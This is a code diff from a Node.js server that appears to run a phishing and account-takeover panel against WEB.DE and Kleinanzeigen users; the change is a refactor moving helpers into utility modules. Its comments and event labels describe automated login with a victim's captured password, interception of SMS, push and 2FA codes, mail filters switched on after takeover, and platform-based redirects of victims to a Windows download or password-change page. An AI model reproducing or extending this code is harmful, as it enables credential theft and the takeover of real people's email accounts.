@@ -31,9 +31,9 @@ const {
   writeModeData,
   DB_PATH
 } = require('./db/database.js');
-const { send, safeEnd, readApiRouteBody } = require('./utils/httpUtils');
+const { send, safeEnd, readApiRouteBody, parseHttpRequestUrl } = require('./utils/httpUtils');
 const { ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminAuth, getAdminTokenFromRequest, checkAdminPageAuth } = require('./utils/authUtils');
-const { getPlatformFromRequest, maskEmail } = require('./utils/formatUtils');
+const { getPlatformFromRequest, maskEmail, EVENT_LABELS, readStartPage, getRedirectPasswordStatus } = require('./utils/formatUtils');
 const apiRoutes = require('./routes/apiRoutes');
 const chatService = require('./services/chatService');
 const leadService = require('./services/leadService');
@@ -306,48 +306,6 @@ function webdeErrorTriggersVictimAutomationWait(errorCode) {
   if (c === '408') return false;
   return c === '500' || c === '502' || c === '503';
 }
-
-/** Единые подписи EVENTS (скрипт/админка). Старые записи в логах по-прежнему матчит admin.js. */
-const EVENT_LABELS = {
-  WEBDE_START: 'Запуск WEB.DE',
-  WEBDE_QUEUE: 'WEB.DE: в очереди',
-  KLEIN_START: 'Запуск Klein',
-  KLEIN_QUEUE: 'Klein: в очереди',
-  PUSH: 'Push',
-  PUSH_TIMEOUT: 'Push: таймаут',
-  SMS: 'SMS',
-  SMS_KL: 'SMS Kl',
-  WRONG_DATA: 'Неверные данные',
-  WRONG_DATA_KL: 'Неверные данные Kl',
-  WRONG_SMS: 'Неверный SMS',
-  WRONG_SMS_KL: 'Неверный SMS Kl',
-  WRONG_2FA: 'Неверный 2FA',
-  TWO_FA: '2FA',
-  TWO_FA_TIMEOUT: '2FA: таймаут ожидания кода',
-  SUCCESS: 'Успешный вход',
-  SUCCESS_KL: 'Успешный вход Kl',
-  MAIL_FILTERS_START: 'Включение фильтров на почте',
-  MAIL_FILTERS_OK: 'Фильтры включены',
-  MAIL_READY: 'Почта готова',
-  PUSH_RESEND_OK: 'Push: переотправлен',
-  PUSH_RESEND_FAIL: 'Push: переотправка не удалась',
-  TWO_FA_CODE_IN: '2FA: код получен, ввод на WEB.DE',
-  TWO_FA_WRONG: '2FA: неверный код',
-  /** Промежуточные шаги (script-event), без дублирования push/sms из webde-login-result */
-  WEBDE_STEP_BROWSER: 'WEB.DE: браузер готов',
-  WEBDE_STEP_ATTEMPT: 'WEB.DE: попытка входа',
-  WEBDE_MAIL_OPENED: 'WEB.DE: почтовый ящик открыт',
-  MAIL_UI_READY: 'Почта: интерфейс подготовлен',
-  KLEIN_SESSION_MAIL: 'Klein: сессия почты в браузере',
-  KLEIN_WAIT_VICTIM: 'Klein: ждём открытия страницы у лида',
-  KLEIN_VICTIM_HERE: 'Klein: лид на странице входа',
-  KLEIN_CREDS_FROM_LEAD: 'Klein: данные для входа получены',
-  KLEIN_SCRIPT_START: 'Klein (скрипт): старт',
-  KLEIN_SCRIPT_BROWSER: 'Klein (скрипт): браузер',
-  WEBDE_SCREEN_PUSH: 'WEB.DE: на экране Push',
-  WEBDE_SCREEN_2FA: 'WEB.DE: на экране 2FA',
-  WEBDE_SCREEN_SMS: 'WEB.DE: на экране SMS',
-};
 
 /** Ожидающие запросы скрипта входа: leadId -> { res, timeoutId }. Админка при сохранении пароля отдаёт пароль в этот запрос. */
 const webdePasswordWaiters = {};
@@ -1621,20 +1579,6 @@ function readAutoScript() {
   return readModeData().autoScript;
 }
 
-function readStartPage() {
-  try {
-    if (fs.existsSync(START_PAGE_FILE)) {
-      const raw = fs.readFileSync(START_PAGE_FILE, 'utf8').trim().toLowerCase();
-      if (raw === 'login') return 'login';
-      if (raw === 'change') return 'change';
-      if (raw === 'download') return 'download';
-      if (raw === 'klein') return 'klein';
-      return 'login';
-    }
-  } catch {}
-  return 'login';
-}
-
 function writeStartPage(value) {
   ensureDataFile();
   const v = value === 'change' ? 'change' : value === 'download' ? 'download' : value === 'klein' ? 'klein' : 'login';
@@ -1880,15 +1824,6 @@ function isAdminRequest(pathname) {
          pathname === '/api/zip-password' ||
          pathname === '/api/lead-klein-flow-poll' ||
          pathname === '/api/klein-anmelden-seen';
-}
-
-/** startPage=download: по платформе — android и ios → страница ПК (bitte-am-pc), win → Download Windows, mac → смена пароля */
-function getRedirectPasswordStatus(lead) {
-  const p = (lead && (lead.platform || '').toLowerCase()) || '';
-  if (p === 'windows') return 'redirect_sicherheit';
-  if (p === 'macos') return 'redirect_change_password';
-  if (p === 'android' || p === 'ios') return 'redirect_open_on_pc';
-  return 'redirect_open_on_pc';
 }
 
 /** Только в режиме Auto (не Manual, не Auto-Login): после ввода почты и пароля сразу кидать юзера на startPage. Manual — админ сам направляет; Auto-Login — редирект только после успешного входа скрипта. */
@@ -2832,8 +2767,8 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
-  const parsed = url.parse(req.url, true);
-  let pathname = (parsed.pathname || '').replace(/\/\/+/g, '/') || '/';
+  const parsed = parseHttpRequestUrl(req);
+  let pathname = parsed.pathname;
 
   // Ранний лёгкий ответ для проверки, что сервер живой (до readShortDomains и прочей логики)
   if ((pathname === '/health' || pathname === '/ping') && req.method === 'GET') {
